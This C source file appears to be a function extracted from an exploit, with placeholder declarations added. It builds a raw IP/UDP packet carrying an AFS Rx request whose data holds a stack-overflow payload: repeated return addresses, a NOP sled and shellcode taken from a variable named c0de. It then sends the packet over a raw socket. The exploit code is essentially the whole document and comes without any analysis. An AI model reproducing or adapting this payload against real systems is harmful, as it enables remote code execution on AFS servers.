
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int udphdr_d ;
typedef void* u_long ;
typedef int u_char ;
struct udphdr {int len; scalar_t__ check; void* dest; void* source; } ;
struct iphdr {int version; int ihl; int tot_len; int ttl; unsigned long saddr; unsigned long daddr; scalar_t__ check; int protocol; scalar_t__ frag_off; void* id; scalar_t__ tos; } ;
typedef int iphdr_d ;


 int CODE_LEN ;
 int DATA_SIZE ;
 int IPPROTO_UDP ;
 int RET_ADDR_POS ;
 int RX_CLIENT_INITIATED ;
 int RX_PACKET_TYPE_DATA ;
 char* c0de ;
 scalar_t__ calloc (int,int) ;
 int free (char*) ;
 void* htonl (int) ;
 void* htons (int) ;
 int memcpy (char*,char*,int) ;
 int memset (char*,int,int) ;
 int send_udp_segment (int,struct iphdr*,struct udphdr*,char*,int) ;
 int sprintf (char*,char*,int,...) ;
 int strlen (char*) ;

unsigned long
send_udp_afs_data (int raw_socket,unsigned long src_addr, unsigned short src_port,
            unsigned long dst_addr, unsigned short dst_port)
{
  struct iphdr iphdr_d;
  struct udphdr udphdr_d;

  typedef unsigned int guint32;
  typedef unsigned short guint16;

struct rx_header {
        guint32 epoch;
        guint32 cid;
        guint32 callNumber;
        guint32 seq;
        guint32 serial;
        u_char type;
        u_char flags;





        u_char userStatus;
        u_char securityIndex;
        guint16 spare;
        guint16 serviceId;
};


  struct rx_header rx_header_d;
  int afs_data_len;
  char *afs_data;
  int data_len;
  char *data_buffer;


  iphdr_d.version = 4;
  iphdr_d.ihl = 5;
  iphdr_d.tos = 0;
  iphdr_d.tot_len = sizeof (iphdr_d)+sizeof(udphdr_d);
  iphdr_d.id = htons(545);
  iphdr_d.frag_off = 0;
  iphdr_d.ttl = 90;
  iphdr_d.protocol = IPPROTO_UDP;
  iphdr_d.check = 0;
  iphdr_d.saddr = src_addr;
  iphdr_d.daddr = dst_addr;

  udphdr_d.source = htons (src_port);
  udphdr_d.dest = htons (dst_port);
  udphdr_d.len = 2;
  udphdr_d.check = 0;

  rx_header_d.epoch=htonl(0);
  rx_header_d.cid=htonl(1);
  rx_header_d.callNumber=htonl(2);
  rx_header_d.seq=htonl(3);
  rx_header_d.serial=htonl(4);

  rx_header_d.type=1;
  rx_header_d.flags=1;
  rx_header_d.userStatus=6;
  rx_header_d.securityIndex=7;
  rx_header_d.spare=htons(8);
  rx_header_d.serviceId=htons(9);

  {

   u_long datasize=htonl(600);
   afs_data_len=4*5+600;
   afs_data=(char *)calloc(1,afs_data_len);
   if(afs_data)
   {
    u_long opcode=htonl(134);
    int i;
    int cur_pos;

    char code_buf[300];
    unsigned long esp=0x81c6f02;

    int offset=150 +20;

    for(i=0;i<=150;i+=4)
       *(long *)&code_buf[i]=(unsigned long)esp+offset;
    memset(code_buf+150,0x90,300 -150);
    memcpy(code_buf+300 -strlen(c0de),c0de,strlen(c0de));

    memcpy(afs_data,(char *)&opcode,sizeof(u_long));
    memcpy(afs_data+4*4,(char *)&datasize,sizeof(u_long));
    sprintf(afs_data+4*5,"%d %d %s %d",1,1,"hi",1);

    cur_pos=4*5+strlen(afs_data+4*5);
    memcpy(afs_data+cur_pos,code_buf,300);
    sprintf(afs_data+cur_pos+300," %d",1);

    data_len=sizeof(struct rx_header)+afs_data_len;
    data_buffer=(char *)calloc(1,data_len);
    if(data_buffer)
    {
     memcpy(data_buffer,(char *)&rx_header_d,sizeof(struct rx_header));
     memcpy(data_buffer+sizeof(struct rx_header),afs_data,afs_data_len);
     send_udp_segment (raw_socket,&iphdr_d,&udphdr_d,data_buffer,data_len);
     free(data_buffer);
    }
    free(afs_data);
   }
  }
}
